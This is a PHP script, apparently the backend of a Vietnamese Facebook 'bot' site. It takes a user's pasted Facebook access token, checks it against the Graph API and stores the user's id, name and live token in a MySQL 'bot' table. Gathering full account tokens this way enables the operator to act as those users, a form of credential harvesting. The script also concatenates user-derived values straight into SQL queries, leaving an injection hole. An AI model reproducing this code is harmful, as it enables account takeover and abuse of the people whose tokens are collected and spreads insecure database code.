<?php
session_start();
if(!is_dir('DuySexy/')){ mkdir('DuySexy'); }
if($_POST['access_token']) {
	$token2 = $_POST['access_token'];
	if(preg_match("'access_token=(.*?)&expires_in='", $token2, $matches)){
		$token = $matches[1];
			}else{
		$token = $token2;
	}
$me = me($token);
if($me[id]){
$_SESSION['id'] = $me[id];
$_SESSION['name'] = $me[name];
$_SESSION['access_token'] = $token;
header('Location: DuySexy.php');
$host = "localhost";

$username = "";

$password = "";	

$dbname = "";




$connection = mysql_connect($host,$username,$password);

if (!$connection)

  {

  die('Could not connect: ' . mysql_error());

  }

mysql_select_db($dbname) or die(mysql_error());

mysql_query("SET NAMES utf8");
mysql_query("CREATE TABLE IF NOT EXISTS `bot` (

      `id` int(11) NOT NULL AUTO_INCREMENT,

      `user_id` varchar(32) NOT NULL,

      `name` varchar(32) NOT NULL,

      `access_token` varchar(255) NOT NULL,

      PRIMARY KEY (`id`)

      ) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

   ");
$row = null;

   $result = mysql_query("

      SELECT

         *

      FROM

         bot

      WHERE

         user_id = '" . $_SESSION['id'] . "'

   ");

   

   if($result){

      $row = mysql_fetch_array($result, MYSQL_ASSOC);

      if(mysql_num_rows($result) > 1){

         mysql_query("

            DELETE FROM

               bot

            WHERE

               user_id='" . $_SESSION['id'] . "' AND

               id != '" . $row['id'] . "'

         ");

      }

   }

   

   if(!$row){

      mysql_query(

         "INSERT INTO 

            bot

         SET

            `user_id` = '" .$_SESSION['id']. "',

            `name` = '" . $_SESSION['name'] . "',

            `access_token` = '" .$_SESSION['access_token']. "'

      ");

   } else {

      mysql_query(

         "UPDATE 

            bot

         SET

            `access_token` = '" . $_SESSION['access_token'] . "'

         WHERE

            `id` = " . $row['id'] . "

      ");

  

}

}else{
			session_destroy();
header('Location: DuySexy.php?i=Token không hợp lệ hoặc hết hạn ( Token bắt đầu bằng EAA.....). Vui lòng lấy token mới và đăng nhập lại !')
;
}
}
function me($token) {
return json_decode(auto('https://graph.facebook.com/me?access_token='.$token),true);
}

function auto($url){
   $curl = curl_init();
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
   curl_setopt($curl, CURLOPT_URL, $url);
   $ch = curl_exec($curl);
   curl_close($curl);
   return $ch;
   }
?>